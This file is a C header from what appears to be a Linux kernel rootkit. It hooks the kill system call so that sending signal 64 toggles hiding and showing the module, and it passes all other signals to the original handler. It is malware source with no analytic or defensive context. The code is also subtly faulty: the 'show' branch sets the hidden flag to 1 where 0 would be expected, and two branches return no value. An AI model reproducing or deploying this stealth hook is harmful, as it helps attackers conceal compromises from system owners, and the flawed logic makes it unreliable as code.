#ifndef _KILL_H_
#define _KILL_H_

static asmlinkage long (*orig_kill)(const struct pt_regs *);

notrace asmlinkage int hook_kill(const struct pt_regs *regs) {

    void showme(void);
    void hideme(void);

    int sig = regs->si;

    if ( (sig == 64) && (hidden == 0) ) {

        hideme();
        hidden = 1;
    }
    else if ( (sig == 64) && (hidden == 1) ) {

        showme();
        hidden = 1;
    }
    else {

        return orig_kill(regs);
    }
}

#endif
